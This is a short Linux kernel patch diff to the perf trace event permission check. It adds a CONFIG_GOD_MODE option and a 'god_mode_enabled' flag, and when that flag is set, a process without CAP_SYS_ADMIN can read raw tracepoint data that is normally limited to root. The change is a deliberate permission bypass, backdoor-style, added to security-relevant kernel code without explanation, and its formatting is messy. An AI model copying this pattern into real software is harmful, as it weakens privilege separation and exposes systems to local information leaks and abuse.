@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * trace event based perf event profiling/tracing
  *
@@ -39,7 +42,15 @@ static int perf_trace_event_perm(struct ftrace_event_call *tp_event,
 	 * only allow root to have these.
 	 */
 	if (perf_paranoid_tracepoint_raw() && !capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	return 0;
 }
